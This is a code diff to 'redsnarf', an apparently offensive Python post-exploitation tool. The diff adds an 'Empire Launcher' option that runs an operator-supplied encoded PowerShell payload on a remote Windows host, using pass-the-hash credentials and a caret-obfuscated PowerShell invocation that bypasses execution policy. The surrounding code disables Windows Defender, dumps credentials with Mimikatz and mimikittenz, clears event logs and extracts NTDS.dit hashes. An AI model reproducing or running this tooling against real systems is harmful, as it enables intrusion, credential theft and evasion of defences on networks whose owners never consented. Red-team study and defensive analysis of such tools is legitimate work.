@@ -720,6 +720,40 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
+			if empire_launcher in yesanswers:
+				try:		
+					#Check to make sure port is not already in use
+					for i in xrange(10):
+						PORT = randint(49151,65535)					
+						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if len(stdout_value)>0:
+							break
+
+					my_ip=get_ip_address('eth0')
+					print colored("[+]Attempting to start Empire Launcher",'green')
+					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+					httpd = SocketServer.TCPServer(("",PORT), Handler)
+					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
+					server_process = multiprocessing.Process(target=httpd.serve_forever)
+					server_process.daemon = True
+					server_process.start()	
+					
+					x=' '
+					
+					print colored("\n[+]Empire Powershell Launcher",'green')
+					print colored("[+]Do not include powershell.exe -NoP -sta -NonI -W Hidden -Enc\n",'yellow')
+					response = raw_input("Please enter the PowerShell String to Execute :- ")
+					if response !="":	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+response+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						print colored("[+]Launcher Command Sent...",'yellow')
+						
+					print colored("[+]Stopping web server",'green')
+					server_process.terminate()
+
+				except OSError:
+					print colored("[-]Something went wrong here...",'red')
+
 			if multi_rdp in yesanswers:
 				try:
 					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
@@ -763,8 +797,6 @@ def datadump(user, passw, host, path, os_version):
 							AVstatus='Off'
 
 					if "Windows 10.0" in os_version:
-						
-												
 						#If Windows Defender is turned on turn off 
 						if AVstatus=='On':
 							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
@@ -793,8 +825,7 @@ def datadump(user, passw, host, path, os_version):
 								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
 								en = b64encode(line.encode('UTF-16LE'))						
 								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-
-					
+										
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
@@ -851,7 +882,7 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/kittenz_creds1.txt",'yellow')
 							print colored("[+]Clearing up.....","yellow")
 							os.system("rm /tmp/mimikittenz.ps1")
-							print colored("[+]Stoping web server",'green')
+							print colored("[+]Stopping web server",'green')
 							server_process.terminate()
 					else:
 						print colored("[-]kittenz_creds.txt file not found",'red')
@@ -1423,7 +1454,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3a", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -1436,13 +1467,14 @@ p.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="
 p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
 p.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
 # Utilities
-p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
-p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
-p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
-p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
-p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
 p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
+p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
+p.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
+p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
+p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
+p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
 # Hash related
 p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
 p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
@@ -1525,6 +1557,7 @@ screenshot=args.screenshot
 unattend=args.unattend
 user_desc=args.user_desc
 recorddesktop=args.recorddesktop
+empire_launcher=args.empire_launcher
 
 if lat in yesanswers:
 	WriteLAT()
